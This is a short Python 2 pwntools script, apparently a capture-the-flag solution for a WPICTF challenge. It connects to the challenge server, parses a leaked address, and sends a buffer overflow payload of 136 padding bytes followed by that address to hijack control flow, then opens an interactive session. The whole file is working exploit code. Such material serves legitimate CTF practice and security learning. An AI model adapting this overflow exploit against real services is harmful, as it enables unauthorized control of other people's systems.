#!/usr/bin/env python2
from pwn import *
import re

r = remote('ezpz.wpictf.xyz', 31337)
line = r.recvline()
print(line)

address_str = re.search('0x([^ ]+)', line).group(1)
address = address_str.decode('hex')[::-1]
attack = ('A'*8*17)+address
print(attack)

r.sendline(attack)
r.interactive()

